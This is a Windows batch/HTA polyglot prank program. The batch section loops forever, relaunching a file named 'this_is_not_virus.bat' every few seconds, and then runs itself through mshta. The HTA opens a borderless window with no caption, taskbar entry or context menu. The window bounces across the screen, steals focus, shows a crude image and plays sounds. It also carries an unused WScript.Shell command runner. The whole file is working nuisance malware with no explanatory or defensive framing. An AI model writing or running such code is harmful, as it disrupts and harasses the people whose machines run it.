@echo off
goto i
e:
TimeOut 3 >nul
i:
start C:\this_is_not_virus.bat
call goto e
mshta.exe "%~F0"

goto :EOF

-->

<!DOCTYPE html>
<html>
<head>
    <TITLE>cookie</TITLE>
    <HTA:APPLICATION ID="oHTA"
     INNERBORDER="no"
     APPLICATIONNAME="cookie"
     BORDER="none"
     CAPTION="no"
     ICON=""
     SCROLL="no"
     MAXIMIZEBUTTON="no"
     MINIMIZEBUTTON="no"
     SHOWINTASKBAR="no"
     SINGLEINSTANCE="no"
     SYSMENU="no"
     VERSION="0.0"
     WINDOWSTATE="maximize"/>

</head>
<body oncontextmenu="return false;">
    <img src="https://raw.githubusercontent.com/MrCubeCode/Cube-SITE/main/peen.jpg"
         width="500"
         height="500" />
  
    <bgsound src="audio.mp3">

        
        <canvas id="canvasid" width=300; height=300 style="border:0px black"></canvas>
        <div id="resilt"></div>
        <style>

            body {
                margin: 0px;
                padding: 0px;
                background-color: black !important;
                overflow-y: hidden;
            }

            #page {
                width: 100%;
                overflow: hidden;
            }

            canvas#canvasid {
                height: 100%;
                width: 100%;
                position: fixed;
                background: #000000;
            }

            html {
                overflow: auto;
            }

            div {
                position: fixed;
                z-index: 100;
            }
        </style>

        <script>
            //runApp(mshta.exe);
            function getRandomNumber(min, max) {
                return Math.random() * (max - min) + min
            }
            x = top.screenLeft;
            y = top.screenTop;
            f = -1
            var move = true;
            var toX = Math.round(getRandomNumber(0, 1920));
            var toY = Math.round(getRandomNumber(0, 1080));

            //window.moveTo(0, 880);
            setInterval(js, 10);
            function startmove() {
                move = true;
            }
            toX = Math.round(getRandomNumber(0, 1920));
            toY = Math.round(getRandomNumber(0, 1080));
            window.moveTo(toX, toY);
            toX = 0;
            toY = 0;

            // setInterval(movetos, 1000);


            var xOff = 5;
            var yOff = 5;
            var xPos = 400;
            var yPos = -100;
            var flagRun = 1;


            playBall()
            function newXlt() {
                xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
                window.focus()
            }

            function newXrt() {
                xOff = Math.ceil(7 * Math.random()) * 5 - 10;
            }

            function newYup() {
                yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
            }

            function newYdn() {
                yOff = Math.ceil(7 * Math.random()) * 5 - 10;
            }
            function fOff() {
                flagrun = 0;
            }

            function playBall() {
                xPos += xOff;
                yPos += yOff;
                if (xPos > screen.width - 175) {
                    newXlt();
                }
                if (xPos < 0) {
                    newXrt();
                }
                if (yPos > screen.height - 100) {
                    newYup();
                }
                if (yPos < 0) {
                    newYdn();
                }
                if (flagRun == 1) {
                    window.moveTo(xPos, yPos);
                    setTimeout(playBall, 1);
                }
            }

            function js() {


                // window.moveTo(x, 880);

                // js()

            }
            function play(aud) {
                document.getElementsByTagName("bgsound")[0].src = aud;
            }
            function runApp(which) {
                WshShell = new ActiveXObject("WScript.Shell");
                WshShell.Run(which, 1, true);
            }
            var x0, y0;



            document.onmousedown = function () {
                play("nom.mp3");

              
            }
            function close2() {
                close();
            }
        </script>

</body>
</html>
